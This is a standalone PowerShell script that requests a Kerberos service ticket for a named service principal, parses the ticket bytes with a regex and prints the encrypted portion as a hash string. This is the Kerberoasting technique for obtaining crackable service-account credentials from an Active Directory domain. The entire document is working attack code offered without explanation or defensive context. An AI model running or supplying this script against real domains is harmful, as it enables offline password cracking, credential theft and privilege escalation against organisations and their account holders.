$SPNName = "SomeSPNOfDomain"
Add-Type -AssemblyNAme System.IdentityModel
$Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName
$TicketByteStream = $Ticket.GetRequest()
$TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)'){
    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482'){
        Write-Warning "Error parsing ciphertext for the" $SPNName
        $Hash = $null
    }else{
        $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
        echo $Hash
    }
}

